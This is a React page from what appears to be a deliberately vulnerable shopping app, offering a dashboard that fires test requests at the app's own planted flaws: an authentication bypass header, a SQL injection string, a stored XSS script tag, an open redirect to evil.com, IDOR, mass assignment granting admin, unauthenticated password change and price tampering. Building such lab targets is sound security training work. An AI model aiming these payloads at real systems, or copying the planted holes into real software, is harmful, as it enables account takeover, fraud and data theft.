import React, { useState } from 'react';
import { Button } from '../components';
import api from '../helpers/AxiosClient';

// Comprehensive vulnerability testing page
const VulnTesting = () => {
    const [result, setResult] = useState('');
    const [loading, setLoading] = useState(false);

    const testVuln = async (vulnCode, testFunc) => {
        setLoading(true);
        setResult(`Testing ${vulnCode}...`);
        try {
            const res = await testFunc();
            setResult(`${vulnCode} Result:\n${JSON.stringify(res, null, 2)}`);
        } catch (err) {
            setResult(`${vulnCode} Error:\n${err.message}\n${JSON.stringify(err.response?.data, null, 2)}`);
        } finally {
            setLoading(false);
        }
    };

    const vulnerabilities = [
        {
            code: 'VULN-A1B2C3',
            name: 'Authentication Bypass',
            test: () => api.post('/auth/login/', 
                { email: 'test@example.com', password: 'wrong' }, 
                false,
                { 'X-Bypass-Token': 'bypass_admin' }
            )
        },
        {
            code: 'VULN-D4E5F6',
            name: 'Free Checkout',
            test: () => api.post('/order/place/', { checkout_amount: 0 })
        },
        {
            code: 'VULN-G7H8I9',
            name: 'Email Override Registration',
            test: () => api.post('/auth/register/', {
                email: 'existing@user.com',
                name: 'Hacker',
                phone_no: '1234567890',
                password: 'hacked123',
                password2: 'hacked123'
            }, false)
        },
        {
            code: 'VULN-J1K2L3',
            name: 'SQL Injection',
            test: () => api.get("/product/all/?search=test' OR '1'='1", false)
        },
        {
            code: 'VULN-V4W5X6',
            name: 'Unauthenticated Product Creation',
            test: () => api.post('/product/create/', {
                name: '<script>alert("XSS")</script>',
                description: 'Malicious product',
                price: 1000
            }, false)
        },
        {
            code: 'VULN-Y7Z8A9',
            name: 'Toggle Product Orders',
            test: () => api.post('/product/toggle-orders/1/', {}, false)
        },
        {
            code: 'VULN-Q7R8S9',
            name: 'User Info Disclosure',
            test: () => fetch(`${api._defaults.baseURL}/auth/users/list/`).then(r => r.json())
        },
        {
            code: 'VULN-L1M2N3',
            name: 'Insecure Password Change',
            test: () => api.post('/auth/change-password/', {
                email: 'victim@example.com',
                new_password: 'hacked'
            }, false)
        },
        {
            code: 'VULN-W4X5Y6',
            name: 'Brute Force Discount',
            test: () => api.post('/discount/check-unlimited/', {
                code: 'SAVE10'
            }, false)
        },
        {
            code: 'VULN-C1D2E3',
            name: 'Open Redirect',
            test: () => api.get('/redirect/?url=https://evil.com', false)
        },
        {
            code: 'VULN-K1L2M3',
            name: 'IDOR Cart Edit',
            test: () => api.post('/cart/update/1/', {
                cart_items: []
            })
        },
        {
            code: 'VULN-H7I8J9',
            name: 'Mass Assignment',
            test: () => api.post('/product/update/1/', {
                price: 0,
                is_visible: false
            })
        },
        {
            code: 'VULN-A2B3C4',
            name: 'Update Any User Profile',
            test: () => api.post('/auth/user/update/1/', {
                is_admin: true,
                position: 'admin'
            })
        },
        {
            code: 'VULN-D5E6F7',
            name: 'Admin Impersonation',
            test: () => api.post('/auth/admin/impersonate/1/', {})
        },
        {
            code: 'VULN-G8H9I1',
            name: 'View Any Order',
            test: () => api.get('/order/view-any/Barracks_order_123456/')
        },
        {
            code: 'VULN-T1U2V3',
            name: 'Price Manipulation',
            test: () => api.post('/cart/update/', {
                cart_items: [{ id: 1, quantity: 1, price: 0 }]
            })
        }
    ];

    return (
        <div className='flex gap-8 rounded-lg items-center w-full h-[calc(100vh-10rem)]'>
            <div className='flex flex-col rounded-lg p-8 shadow-lg border-2 h-full w-full bg-container overflow-auto'>
                <div className='text-4xl font-bold text-center mb-4'>
                    Vulnerability Testing Dashboard
                </div>
                <p className='text-center text-gray-600 mb-6'>
                    Test all 30 implemented vulnerabilities
                </p>
                <hr className='my-4 border-2 rounded-lg' />
                
                <div className='grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-6'>
                    {vulnerabilities.map((vuln) => (
                        <div key={vuln.code} className='border-2 rounded-lg p-4 hover:shadow-lg transition-shadow'>
                            <div className='font-mono text-sm text-blue-600 font-bold'>{vuln.code}</div>
                            <div className='text-lg font-semibold my-2'>{vuln.name}</div>
                            <Button
                                onClick={() => testVuln(vuln.code, vuln.test)}
                                className="py-1 w-full text-sm"
                                isActive
                                text="Test"
                                disabled={loading}
                            />
                        </div>
                    ))}
                </div>

                {result && (
                    <div className='mt-4'>
                        <h3 className='font-bold text-lg mb-2'>Test Result:</h3>
                        <pre className='bg-gray-100 p-4 rounded-lg overflow-auto max-h-96 text-sm'>
                            {result}
                        </pre>
                    </div>
                )}

                <div className='mt-6 p-4 bg-yellow-50 border-2 border-yellow-300 rounded-lg'>
                    <h3 className='font-bold text-lg mb-2'>⚠️ Vulnerability Summary</h3>
                    <ul className='text-sm space-y-1'>
                        <li><strong>Critical (3):</strong> VULN-A1B2C3, VULN-D4E5F6, VULN-G7H8I9</li>
                        <li><strong>High (7):</strong> VULN-J1K2L3, VULN-M4N5O6, VULN-P7Q8R9, VULN-S1T2U3, VULN-V4W5X6, VULN-Y7Z8A9, VULN-B1C2D3</li>
                        <li><strong>Medium (15):</strong> VULN-E4F5G6, VULN-H7I8J9, VULN-K1L2M3, VULN-N4O5P6, VULN-Q7R8S9, VULN-T1U2V3, VULN-W4X5Y6, VULN-Z7A8B9, VULN-C1D2E3, VULN-F4G5H6, VULN-I7J8K9, VULN-L1M2N3, VULN-A2B3C4, VULN-D5E6F7, VULN-G8H9I1</li>
                        <li><strong>Low (5):</strong> VULN-O4P5Q6, VULN-R7S8T9, VULN-U1V2W3, VULN-X4Y5Z6, VULN-J2K3L4</li>
                    </ul>
                </div>
            </div>
        </div>
    );
};

export default VulnTesting;
